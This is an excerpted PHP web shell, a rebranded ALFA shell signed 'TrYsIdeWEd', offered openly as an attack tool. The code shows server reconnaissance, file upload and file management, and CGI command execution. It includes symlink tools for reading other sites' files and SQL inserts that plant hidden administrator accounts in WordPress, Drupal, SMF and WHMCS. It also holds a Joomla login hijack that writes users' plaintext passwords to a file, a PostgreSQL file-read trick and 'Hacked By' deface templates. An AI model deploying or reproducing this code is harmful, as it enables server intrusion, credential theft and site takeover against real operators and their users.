...
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'TrYsIdeWEd',
    'password' => '081ce2c3525e5aa97e6423f709327ce4',
    'safe_mode' => '0',
    'login_page' => '403',
    'show_icons' => '1',
...
define("__ALFA_VERSION__", "6.6.6");
define("__ALFA_UPDATE__", "2");
define("__ALFA_CODE_NAME__", "TrYsIdeWEd");
define("__TrYsIdeWEd_FOLDER__", "TrYsIdeWEd");
...
<center><img style="border-radius:100px;" width="500" height="250" alt="
TrYsIdeWEd" draggable="false" src="https://img1.picmix.com/output/stamp/normal/7/8/1/2/2632187_eb532.gif" /></center>
...
function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if($is_curl||$is_socket){
		...
		$cgi_url = __TrYsIdeWEd_FOLDER__."/TrYcgiapi/".$lang.$cgi_ext;
...
echo '<b><big><font color=#FA0007>Kernel : </font><font color="#FFFFF">'.(function_exists('php_uname')?php_uname():'???').'</font></b></big>';
$safe_mode = @ini_get('safe_mode');
if($safe_mode){$r = "<b style='color: red'>On</b>";}else{$r = "<b style='color: red'>Off</b>";}
echo "<br><b style='color: #FA0007'>OS: </font><font color=white>" . PHP_OS . "</font><br>";
echo "<b style='color: #FA0007'>Software: </font><font color=white>" . $_SERVER ['SERVER_SOFTWARE'] . "</font><br>";
echo "PHP Version: <font color=white>" . PHP_VERSION .  "</font><br />";
echo "PWD:<font color=#FFFFFF> " . str_replace("\\","/",@alfaGetCwd()) . "/<br />";
echo "<b style='color: #FA0007'>Safe Mode : $r<br>";
echo"<font color=#FA0007>Disable functions : </font>";
$disfun = @ini_get('disable_functions');
if(empty($disfun)){$disfun = '<font color="red">NONE</font>';}
echo"<font color=red>";
echo "$disfun";
echo"</font><br>";
echo "<b style='color: #FA0007'>Your Ip Address is :  </font><font color=white>" . $_SERVER['REMOTE_ADDR'] . "</font><br>";
echo "<b style='color: #FA0007'>Server Ip Address is :  </font><font color=white>".(function_exists('gethostbyname')?@gethostbyname($_SERVER["HTTP_HOST"]):'???')."</font><br><p>";
...
if(@move_uploaded_file($_FILES['file']['tmp_name'], __ZGVjb2Rlcg(@$_POST['cwd']).'/'.$_FILES['file']['name'])){echo '<b><font color="#FA0007"><center>Upload Successfully ;)</font></a><font color="#FA0007"></b><br><br></center>'; }
else{echo '<center><b><font color="#FA0007">Upload failed :(</font></a><font color="#7CFC0"></b></center><br><br>'; }
}
...
<div id=\'hidden_sh\'><a class="alert_red" target="_blank" href="?solevisible"><span style="color:#Ffffff;">'.__ALFA_CODE_NAME__.'</span><br><small>Version: <span class="hidden_shell_version">'.__ALFA_VERSION__.'</span></small></a></div>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="180" height="170" alt="TrYsIdeWEd ~ '.__ALFA_VERSION__.'" draggable="false" src="https://trysidewed.pages.dev/logo/TrYsIdeWEd.gif" /></td>
</tr>
<tr>
...
function __showicon($r){
	$s['btn']='https://trysidewed.pages.dev/ico/go/TrYsIdeWEd.jpg';
	$s['alfamini']='https://trysidewed.pages.dev/logo/TrYsIdeWEd.png';
	$s['loader']='https://trysidewed.pages.dev/logo/TrYsIdeWEd.png';
...
<font color='#00A220'>Shell Coded By TrYsIdeWEd</font><br>
<font color='#00A220'>Contact : TrYsIdeWEd@gmail.com</font><br>
<font color='#00A220'>Telegram Channel: @TrYsIdeWEdOFC</font><br>
<font color='#FFFFFF'>Skype : TrYsIdeWEd.invisible</font><br>
<font color='#FFFFFF'>Skype : TrYsIdeWEd</font><br>
<font color='#FF0000'>Persian Gulf For Ever</font><br>
<font color='#FF0000'>TrYsIdeWEd</font><br>
...
if(count($selected_data) > 0){
	if($db){
		...
		echo __pre();
		echo "<center><font color='#FC0004'>".$tbls."</font></center>";
	}
}
...
if($db){
	...
	foreach($data as $tbl => $cols){
	    echo '<li><span style="color:#FC0004;" class="box">'.$tbl.' ('.$cols["data_count"].')</span><ul class="nested">';
	    foreach($cols["cols"] as $col){
	        echo '<li tbl="'.$tbl.'"><span style="color:#FC0004;" tbl="'.$tbl.'" class="box sub-box">' . $col . '</span></li>';
	    }
	    echo '</ul></li>';
	}
	echo '</ul>';
...
$create = "insert into tblclients (email) values('TrYsIdeWEd@fbi.gov')";
...
$AlfaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=TrYsIdeWEd@fbi.gov");
...
function alfacheckupdate(){
	...
	if(function_exists("curl_version")){
		$update = new AlfaCURL();
		$json = $update->Send("http://soIevisible.com/update.json?ver=".__TrY_VERSION__);
...
function alfaWriteTocgiapi($name, $source){
	...
	if(in_array($name, $not_api)){
		...
		@chdir($GLOBALS['home_cwd'] . "/" . __TrYsIdeWEd_FOLDER__);
	}
	@mkdir('TrYcgiapi',0755);
	__write_file("TrYcgiapi/".$name, __get_resource($source));
	@chmod("TrYcgiapi/".$name, 0755);
	return $temp;
}
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ ./TrYsIdeWEd &copy; 2019-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: 1KLty8LUqnqsXkM3Qkvy2Kpv4gLt7Ugcyo\");' style='color: FFDBDC;text-decoration: none;'></a></span> <span style='letter-spacing: 2px;color: #FFDBDC;'>TrYsIdeWEd</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank'></a></span></div></td>
</tr>
</table>
</div>
...
if($GLOBALS['glob_chdir_false']){
	...
	}else{echo"<script>alfaShowNotification('folder isnt writable !', 'Files manager', 'error');</script>";
	}
}
break;
case 'delete':
...
echo '<div><div class="filters-holder"><span>Filter: </span><input style="color:#FC0005;" autocomplete="off" type="text" id="regex-filter" name="name-filter" onkeydown="doFilterName(this);"><span style="margin-left:10px">Sort By: </span><select name="sort_files" onchange="sortBySelectedValue(this,\'alfa_sort_by\');" style="color:#FC0005;"><option value="name" '.($alfa_sort_by == 'name'?'selected':'').'>Name</option><option value="size" '.($alfa_sort_by == 'size'?'selected':'').'>Size</option><option value="modify" '.($alfa_sort_by == 'modify'?'selected':'').'>Modify</option></select><span style="margin-left:10px">Direction: </span><select name="direction_filesman" onChange="sortBySelectedValue(this,\'alfa_filesman_direction\')" style="color:#FC0005;"><option value="asc" '.($alfa_filesman_direction == 'asc'?'selected':'').'>Ascending</option><option value="desc" '.($alfa_filesman_direction == 'desc'?'selected':'').'>Descending</option></select><span style="margin-left:10px;"> limit: </span><input style="text-align:center;width: 40px;color:#FC0005;" type="text" name="limited_number" value="'.$alfa_limited_files.'" oninput="this.value=this.value.replace(/[^0-9]/g,\'\');setCookie(\'alfa_limited_files\', this.value, 2012);"><span style="margin-left:10px;">Files Count: <b style="color:#FC0005;">'.($count_dirContent-1).'</b></span></div><div class="header">';
if($dirContent == false){
...
$s = 'https://trysidewed.pages.dev/ico/fd/TrYsIdeWEd.png';
$types = array('json','ppt','pptx','xls','xlsx','msi','config','cgi','pm','c','cpp','cs','java','aspx','asp','db','ttf','eot','woff','woff2','woff','conf','log','apk','cab','bz2','tgz','dmg','izo','jar','7z','iso','rar','bat','sh','alfa','gz','tar','php','php4','php5','phtml','html','xhtml','shtml','htm','zip','png','jpg','jpeg','gif','bmp','ico','txt','js','rb','py','xml','css','sql','htaccess','pl','ini','dll','exe','mp3','mp4','m4a','mov','flv','swf','mkv','avi','wmv','mpg','mpeg','dat','pdf','3gp','doc','docx','docm');
if($type!='file'){
return ($file=='..'?$s.'back.png':$s.'https://trysidewed.pages.dev/ico/fd/TrYsIdeWEd.png');
}else{
$ext = explode('.',$file);
$ext = end($ext);
$ext = strtolower($ext);
...
<textarea name=index rows='19' cols='103'><title>Hacked By TrYsIdeWEd</title><b>Hacked By TrYsIdeWEd</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['alfa6'])){
...
if($_POST['alfa8']=='>>'){
$s0levisible="Powered By TrYsIdeWEd";
$dbu = $_POST['alfa2'];
$dbn = $_POST['alfa3'];
$dbp = $_POST['alfa4'];
$dbh = $_POST['alfa5'];
...
<title>Hacked By TrYsIdeWEd</title><b>Hacked By TrYsIdeWEd</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
if(isset($_POST['alfa6'])){
...
$table = array('td1' =>
 ...
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'kh', 'inputValue' => 'TrYsIdeWEd', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'TrYsIdeWEd@fbi.gov', 'inputSize' => '50')
);
create_table($table);
...
$solevisible=@mysqli_query($conn,"insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','first_name','TrYsIdeWEd'),(null,'".$res."','last_name','TrYsIdeWEd'),(null,'".$res."','nickname','TrYsIdeWEd'),(null,'".$res."','description','TrYsIdeWEd'),(null,'".$res."','rich_editing','true'),(null,'".$res."','comment_shortcuts','false'),(null,'".$res."','admin_color','fresh'),(null,'".$res."','use_ssl','0'),(null,'".$res."','show_admin_bar_front','true'),(null,'".$res."','".$prefix."capabilities','a:1:{s:13:\"administrator\";b:1;}'),(null,'".$res."','".$prefix."user_level','10'),(null,'".$res."','show_welcome_panel','1'),(null,'".$res."','".$prefix."dashboard_quick_press_last_post_id','3')") or die(mysqli_error($conn));
if($solevisible){
...
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 ...
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'TrYsIdeWEd', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'TrYsIdeWEd@fbi.gov', 'inputSize' => '50')
);
create_table($table);
...
$table = array('td1' =>
 ...
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'hi', 'inputValue' => 'TrYsIdeWEd', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'TrYsIdeWEd@fbi.gov', 'inputSize' => '50')
);
create_table($table);
...
$table = array('td1' =>
 ...
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
 'td6' =>
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
...
$solevisible=@mysqli_query($conn,"insert into users (uid,name,pass,mail,signature_format,status,timezone,init) values('$getDescuid','$admin','\$S\$DP2y9AbolCBOd\/WyQcpzu4zF57qE0noyCNeXZWv.37R66VsFjOiC','TrYsIdeWEd@fbi.gov','filtered_html','1','Europe/Berlin','TrYsIdeWEd@fbi.gov')") or die(mysqli_error($conn));
...
$admin = $_POST['alfa8'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$setpwAlg = sha1(strtolower($admin) . 'TrYsIdeWEd');
$solevisible=@mysqli_query($conn,"insert into {$prefix}members (id_member,member_name,id_group,real_name,passwd,email_address) values(null,'$admin','1','$admin','$setpwAlg','TrYsIdeWEd@fbi.gov')") or die(mysqli_error($conn));
if($solevisible){
__alert('Success... '.$admin.' is created...');}
}
}
...
function alfaCreateParentFolder(){
	$parent = $GLOBALS['home_cwd'] . "/" . __TrYsIdeWEd_FOLDER__;
	if(!@is_dir($parent)){
...
echo __pre();
echo '<center><b><font color="white">Click >> </font><a target="_blank" href="'.__TrYsIdeWEd_FOLDER__."/".$sym_dir.'" ><b><font size="4">'.$symname.'</font></b></a></b></center>';
}
...
echo $table_header;
$count=1;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="{http}"/><span style="color:#00A220;margin-left:10px;"><b>{domain}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{owner}</font></b></td><td><a href="'.__TrYsIdeWEd_FOLDER__.'/alfasymlink/root{sympath}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
foreach($lines as $line){
	...
	if($anonymous){
		...
		foreach($anony_domains as $anony){
 		...
 		if($state == "named.conf"){if(@strstr($line, 'zone')){
...
$count=1;
echo $table_header;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="http://www.{url}"/><span style="color:#00A220;margin-left:10px;"><b>{url}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{user}</font></b></td><td><a href="'.__TrYsIdeWEd_FOLDER__.'/alfasymlink/root{cwd}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
if($sole){
...
break;
case 'pgsql':
$this->query("CREATE TABLE TrYsIdeWEd(file text);COPY TrYsIdeWEd FROM '".addslashes($str)."';select file from TrYsIdeWEd;");
$r=array();
while($i=$this->fetch())
$r[] = $i['file'];
$this->query('drop table TrYsIdeWEd');
...
@chmod($name,0755);
echo '<iframe src="'.__TrYsIdeWEd_FOLDER__.'/cgialfa/'.$name.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
}
}
echo $div;
alfafooter();
...
echo("<center><table border='1'>");
echo("<tr><td><b><font color=\"#27FF00\">Register</font></td><td>$registrar</td></tr></b>");
echo("<tr><td><b><font color=\"#27FF00\">Setting</font></td><td>$setting</td></tr></b>");
echo("<tr><td><b><font color=\"#27FF00\">Value</font></td><td>$value</td></tr></b>");
echo "</table><br><br></center>";
}
}
...
echo "<form method=post onsubmit='g(\"FilesMan\",this.c.value,\"\");return false;'><span><font color=#FA5558>Change Dir <font color=#FFFF01>..:: </font><font color=red><b>$user</b></font><font color=#FFFF01> ::..</font></font></span><br><input class='foottable' type=text name=c value='$path'><input type=submit value='>>'></form><br>";
}
...
break;
case "phpbb":hijackPHPBB($cmspath,$saveto);break;
default:
echo "error!";
break;
}
...
$code = '<?php jimport(\'joomla.user.authentication\');$Alfa_auth = & JAuthentication::getInstance();$TrYsIdeWEd = array(\'username\'=>$_POST[\'username\'],\'password\'=>$_POST[\'passwd\']);$Alfa_options = array();$Alfa_response = $Alfa_auth->authenticate($TrYsIdeWEd, $Alfa_options);if($Alfa_response->status == 1){$alfa_file="{saveto_path}";$fp=@fopen($alfa_file,"a+");@fwrite($fp, $Alfa_response->username.":".$_POST[\'passwd\']." ( ".$Alfa_response->email." )\n");@fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}?>';
$code=str_replace('{saveto_path}',$saveto,$code);
...
$s = explode(',',$disfun);
$f = array_unique($s);
echo '<center><br><b><font color="#FA0007">Disable Functions</font></b><pre><table border="1"><tr><td align="center" style="background-color: red;color: white;width:5%">#</td><td align="center" style="background-color: red;color: white;">Func Name</td></tr>';
$i=1;
foreach($f as $s){
$s=trim($s);
...
return('<iframe src="'.__TrYsIdeWEd_FOLDER__."/".$f.'" width="'.$width.'" height="'.$height.'" frameborder="0"></iframe>');
}
class AlfaCURL {
public $headers;
public $user_agent;
